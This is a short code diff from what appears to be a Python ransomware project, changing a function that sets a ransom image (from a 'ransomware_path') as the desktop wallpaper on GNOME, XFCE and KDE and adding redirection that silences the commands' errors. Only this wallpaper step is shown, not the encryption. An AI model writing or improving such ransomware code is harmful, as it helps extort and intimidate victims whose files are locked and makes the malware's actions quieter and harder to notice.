@@ -55,10 +55,10 @@ for (i=0;i<Desktops.length;i++) {
         d.writeConfig("Image", "file://%s");
 }'
 """ %(os.path.join(variables.ransomware_path, "img.png"))
-    os.system(gnome)
-    os.system(xfce)
-    os.system(xfce1)
-    os.system(kde)
+    os.system(gnome + " 2>/dev/null")
+    os.system(xfce + " 2>/dev/null")
+    os.system(xfce1 + " 2>/dev/null")
+    os.system(kde + " 2>/dev/null")
     
     
 def run_subprocess(command):
